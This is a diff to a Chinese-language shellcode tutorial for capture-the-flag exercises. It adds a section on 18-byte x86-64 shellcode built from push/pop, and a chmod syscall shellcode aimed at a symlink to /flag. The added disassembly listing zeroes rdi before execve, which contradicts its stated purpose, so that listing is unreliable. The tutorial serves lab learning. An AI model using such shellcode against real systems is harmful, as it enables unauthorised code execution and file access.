@@ -19,6 +19,7 @@ comments: true
 - [6. shellcode instance](#6-shellcode-instance)
   - [6.1 直接编写shellcode](#61-直接编写shellcode)
   - [6.2 shellcode作为跳板，执行其他程序](#62-shellcode作为跳板执行其他程序)
+  - [6.3 18字节shellcode](#63-18字节shellcode)
 
 
 ## 1. 介绍: shellcode是什么<br>
@@ -198,7 +199,7 @@ objcopy --dump-section .text=shellcode.raw shellcode.elf
 .global _start
 _start:
 .intel_syntax noprefix
-#.fill 0x800, 1, 0x90 # fill with nop
+#.fill 0x1000, 1, 0x90 # fill with nop
         mov rax, 2 # sys_create
         lea rdi, [rip+file_name] # file_name
         mov rsi, 2 # O_RDWR
@@ -261,10 +262,44 @@ get_address:
     mov edx, 0                  ;可绕过0x48字符检验
     mov al, 0x3b                ; syscall编号execve
     syscall                     ; 执行系统调用
-    ret                         ； 不
+    ret                         
 call_shellcode:
     call get_address            ; get string addr
     db '/home/hacker/Shellcode/level3/openflag'               ;
 ```
 
 可执行程序就简单了，用c写个程序然后执行它即可。<br>
+
+### 6.3 18字节shellcode<br>
+如果你能够写入的shellcode只有18字节，你会怎么写?<br>
+**用mov的话，是做不到的，但是用push/pop操作，就有可能！**<br>
+因为相比于`mov`,`push/pop`所需的字节数更少！<br>
+
+```asm
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x000000002436f000 | 6a 31                                         | push 0x31
+0x000000002436f002 | 48 89 e7                                      | mov rdi, rsp
+0x000000002436f005 | 6a 00                                         | push 0
+0x000000002436f007 | 5e                                            | pop rsi
+0x000000002436f008 | 48 31 ff                                      | xor rdi, rdi
+0x000000002436f00b | 6a 3b                                         | push 0x3b
+0x000000002436f00d | 58                                            | pop rax
+0x000000002436f00e | 0f 05                                         | syscall 
+```
+
+在你想读的文件名字太长怎么办？使用`ln -s /flag f`创建软链接！<br>
+代码展示如下:<br>
+
+```asm
+.global _start
+_start:
+.intel_syntax noprefix
+        push 0x66
+        mov rdi, rsp
+        push 4
+        pop rsi
+        push 90 # sys_chmod
+        pop rax
+        syscall
+```
